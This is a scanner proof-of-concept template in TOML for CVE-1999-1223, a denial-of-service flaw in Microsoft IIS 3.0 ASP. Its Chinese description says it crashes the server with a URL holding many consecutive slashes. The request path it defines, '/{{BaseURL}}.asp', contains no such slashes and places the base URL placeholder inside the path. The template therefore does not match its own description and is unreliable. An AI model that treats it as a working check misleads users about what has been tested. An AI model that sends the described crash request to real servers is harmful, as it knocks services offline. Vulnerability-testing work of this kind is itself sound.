[info]
author = "ave"
description = "Microsoft IIS 3.0 ASP 拒绝服务漏洞 PoC：向 IIS 3.0 服务器发送包含大量连续斜杠（/）字符的 URL 请求至 ASP 页面，触发 IIS 解析器缓冲区耗尽导致服务进程崩溃。"
id = "POC-AVE-1999-1012"
name = "CVE-1999-1223 PoC"
severity = "medium"
tags = ["ave-1999-1012"]
vuln_id = [
    "CVE-1999-1223",
    "AVE-1999-1012",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}.asp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Server Error",
    "Requested URL is too long",
]
